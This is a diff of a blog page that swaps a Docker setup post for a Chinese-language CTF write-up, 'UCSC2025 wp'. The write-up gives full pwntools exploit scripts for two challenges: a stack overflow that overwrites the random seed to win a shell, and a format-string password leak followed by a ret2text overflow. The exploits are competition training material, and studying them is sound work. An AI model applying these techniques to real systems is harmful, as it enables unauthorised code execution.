@@ -19,7 +19,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://www.vstral.cn/2025/03/18/docker中配置ubuntu16-04环境/"/>
+    <link rel="canonical" href="https://www.vstral.cn/2025/04/20/ucsc2025-wp/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -29,16 +29,18 @@
         
         <meta name="description" content="Welcome to my blog!">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Docker中配置ubuntu16.04环境">
-<meta property="og:url" content="https://www.vstral.cn/2025/03/18/Docker%E4%B8%AD%E9%85%8D%E7%BD%AEubuntu16-04%E7%8E%AF%E5%A2%83/index.html">
+<meta property="og:title" content="UCSC2025 wp">
+<meta property="og:url" content="https://www.vstral.cn/2025/04/20/UCSC2025-wp/index.html">
 <meta property="og:site_name" content="vstral blog">
 <meta property="og:description" content="Welcome to my blog!">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.vstral.cn/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-03-18T13:24:50.000Z">
-<meta property="article:modified_time" content="2025-03-21T13:39:53.480Z">
+<meta property="article:published_time" content="2025-04-20T12:33:13.000Z">
+<meta property="article:modified_time" content="2025-04-20T12:34:04.699Z">
 <meta property="article:author" content="vstral">
-<meta property="article:tag" content="pwn,vstral,ctf,computer,security,二进制,网络安全">
+<meta property="article:tag" content="格式化字符串">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="ret2text">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://www.vstral.cn/images/redefine-og.webp">
     
@@ -52,7 +54,7 @@
     
     <title>
         
-            Docker中配置ubuntu16.04环境 | vstral blog
+            UCSC2025 wp | vstral blog
         
     </title>
 
@@ -262,7 +264,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Docker中配置ubuntu16.04环境</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">UCSC2025 wp</h1>
 			</div>
 			
 		</div>
@@ -283,20 +285,39 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-03-18 21:24:50</span>
-        <span class="mobile">2025-03-18 21:24:50</span>
+        <span class="desktop">2025-04-20 20:33:13</span>
+        <span class="mobile">2025-04-20 20:33:13</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-03-21 21:39:53</span>
-            <span class="mobile">2025-03-21 21:39:53</span>
+            <span class="desktop">2025-04-20 20:34:04</span>
+            <span class="mobile">2025-04-20 20:34:04</span>
             <span class="hover-info">更新</span>
         </span>
     
 
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2text/">ret2text</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
@@ -318,12 +339,24 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>利用docker部署pwn题目靶机环境</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ubuntu16_pwn .</span><br><span class="line"></span><br><span class="line">docker run -it --rm -p 1337:1337 --add-host=host.docker.internal:host-gateway ubuntu16_pwn</span><br></pre></td></tr></table></figure></div>
+			<p><strong>比赛时间 ：2025&#x2F;04&#x2F;20</strong></p>
+<p>比赛前一天把系统搞炸了，今天调了一天的系统和环境，离比赛结束还有10分钟才开始做题，就赛后复现一下吧</p>
+<h1 id="第一题：BoFido-ucsc"><a href="#第一题：BoFido-ucsc" class="headerlink" title="第一题：BoFido-ucsc"></a>第一题：BoFido-ucsc</h1><p>#随机数 #栈溢出</p>
+<p>![[Pasted image 20250420191108.png]]</p>
+<p>用到了伪随机数，生成了10组数字，连续输入10组数字正确即可得到shell</p>
+<p>因为前面输入姓名的地方是存在溢出的，随机数种子也是存在栈上的，所以可以通过溢出来修改种子。先将种子设置为0，然后利用libc生成10组的随机数</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> CDLL</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化预测随机数</span></span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)  <span class="comment"># 使用与目标相同的libc</span></span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">0</span>)  <span class="comment"># 设置种子为0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 预生成所有随机数对</span></span><br><span class="line"></span><br><span class="line">predictions = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    nums = (libc.rand()%<span class="number">255</span>, libc.rand()%<span class="number">255</span>, libc.rand()%<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">    predictions.append(nums)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span>*<span class="number">20</span>                   <span class="comment"># 填充缓冲区</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span>*<span class="number">12</span>                   <span class="comment"># 覆盖v8-v10空间</span></span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)                    <span class="comment"># 覆盖seed值为0</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;\x01&#x27;</span>                   <span class="comment"># 保持i变量初始值为1</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./BoFido&#x27;</span>)  <span class="comment"># 替换成实际二进制文件名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;39.107.58.236&#x27;,41023)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;host&#x27;, port) # 远程连接用</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送缓冲区溢出payload</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互处理10轮猜测</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">f&#x27;[+] Round <span class="subst">&#123;<span class="built_in">round</span>+<span class="number">1</span>&#125;</span>, please choose your numbers:\n&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">    a, b, c = predictions[<span class="built_in">round</span>]</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span> <span class="subst">&#123;b&#125;</span> <span class="subst">&#123;c&#125;</span>&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;You\&#x27;re so lucky! Here is your gift!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
 
-<p>利用docker创建ubuntu16.04调试做题环境</p>
+<h1 id="第二题-userlogin-ucsc"><a href="#第二题-userlogin-ucsc" class="headerlink" title="第二题 userlogin-ucsc"></a>第二题 userlogin-ucsc</h1><p>![[Pasted image 20250420193021.png]]</p>
+<p>![[Pasted image 20250420193055.png]]</p>
+<p>发现login的user里面存在一个格式化字符串漏洞，而且程序还给了一个后门程序，可以通过格式化字符串修改返回地址到shell，试了几次发现因为输入的字节还是少了点，转变思路通过获得密码然后进入root里面溢出到返回地址</p>
+<p>![[Pasted image 20250420202047.png]]</p>
+<p>&#96;</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.update(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&quot;./pwn&quot;</span>  </span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    io = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    io = remote()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------- EXP -------------------#</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s : io.send(s)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : io.sendline(s)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> n,s : io.sendafter(n,s)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> n,s : io.sendlineafter(n,s)</span><br><span class="line"></span><br><span class="line">rc = <span class="keyword">lambda</span> n : io.recv(n)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s : io.recvuntil(s)</span><br><span class="line"></span><br><span class="line">ra = <span class="keyword">lambda</span> : io.recvall()</span><br><span class="line"></span><br><span class="line">it = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------- END -------------------#</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Password:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;supersecureuser&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%13$s&#x27;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Write Something\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">passwd = rc(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;passwd : &quot;</span> + <span class="built_in">str</span>(passwd))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Password:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(passwd)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x401261</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(ret) + p64(shell)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Note: \n&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure></div>
+
+
 
 		</div>
 
@@ -331,18 +364,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> Docker中配置ubuntu16.04环境</li>
+        <li><strong>标题:</strong> UCSC2025 wp</li>
         <li><strong>作者:</strong> vstral</li>
         <li><strong>创建于
-                :</strong> 2025-03-18 21:24:50</li>
+                :</strong> 2025-04-20 20:33:13</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2025-03-21 21:39:53
+                    :</strong> 2025-04-20 20:34:04
             </li>
         
         <li>
-            <strong>链接:</strong> https://www.vstral.cn/2025/03/18/Docker中配置ubuntu16-04环境/
+            <strong>链接:</strong> https://www.vstral.cn/2025/04/20/UCSC2025-wp/
         </li>
         <li>
             <strong>
@@ -361,29 +394,33 @@
 		
 
 		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">#格式化字符串</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ret2text/">#ret2text</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
 		
 
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/03/25/%E5%A0%86%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">堆入门学习之路</span>
-						<span class="post-nav-item">上一篇</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/03/18/%E3%80%90PWN%E3%80%91%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99/">
+				<a class="next" rel="next" href="/2025/03/25/%E5%A0%86%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">【PWN】数组溢出 越界读写</span>
+						<span class="post-nav-title-item">堆入门学习之路</span>
 						<span class="post-nav-item">下一篇</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -404,8 +441,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
-		<div class="page-title">Docker中配置ubuntu16.04环境</div>
-		
+		<div class="page-title">UCSC2025 wp</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%9ABoFido-ucsc"><span class="nav-text">第一题：BoFido-ucsc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-userlogin-ucsc"><span class="nav-text">第二题 userlogin-ucsc</span></a></li></ol>
 
 	</div>
 </div>
